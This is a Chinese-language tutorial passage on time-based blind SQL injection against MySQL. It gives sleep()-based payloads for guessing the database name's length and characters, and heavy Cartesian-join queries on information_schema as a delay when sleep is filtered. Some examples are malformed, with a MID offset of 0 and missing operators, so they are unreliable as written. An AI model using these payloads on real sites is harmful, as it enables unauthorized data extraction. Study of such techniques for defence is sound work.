基于时间的注入

讲到盲注不得不提延时注入，有几个函数sleep, benchmark。有时候boolen盲注用不了的时候就需要利用时间差来注入了。

![](../Images/ba6ba95b12e78b08d38d5d2e60bfd506.png)  

要查询的数据放在if条件里面，由于是计算时间差，当然and,or,xor等等这些都是可以的，下面是几个语句

猜长度

select \* from user where username=‘admin’ xor (SELECT if(((SELECT length(database()) limit 0,1) = 0),sleep(9),0))%23 

猜数据库内容

select \* from user where username=‘admin’ xor (SELECT if((select(MID(database(),0,1)) = 0),sleep(1),0)) 

如果条件存在就sleep一秒，在实际过程中处于网络因素的考虑，通常来说，会sleep一个大数字。比如说网络不好的时候，你访问一个网页要2秒，为了比较，你sleep()的数字肯定要更大一些的。

有时候，sleep这些比较冷门的函数也会被开发人员过滤掉，这个时候就需要用到heavy-query了。

当一个时间盲注中不能用sleep等函数的时候，为了达到延时的效果，可以查询一些量比较大的表做笛卡尔集运算，导致查询缓慢。

利用sql语句

SELECT count(\*) FROM information\_schema.columns A, information\_schema.columns B,  information\_schema.columns C

![](../Images/62dde3ceb3824ac4229e85e2968604eb.png)  

where后面跟的是一个条件，利用and的性质来判断。当两个都为真的时候，就运行后面的语句。

假设在某个sql注入中，他的位置出现在where后面，可以考虑如下利用场景:

  

select \* from admin where id=1 and 1=1 and (SELECT count(\*) FROM information\_schema.columns A, information\_schema.columns B, information\_schema.columns C);

有延时

  

select \* from admin where id=1 and 1=2 and (SELECT count(\*) FROM information\_schema.columns A, information\_schema.columns B, information\_schema.columns C);

 无延时

  

  

猜测数据库名长度

select \* from admin where id=‘admin’ (SELECT length(database()) limit 0,1) = 0 and (SELECT count(\*) FROM information\_schema.columns A, information\_schema.columns B, information\_schema.columns C);

猜测数据库名

select \* from admin where id=‘admin’ select(MID(database(),0,1)) = 0 and (SELECT count(\*) FROM information\_schema.columns A, information\_schema.columns B, information\_schema.columns C);
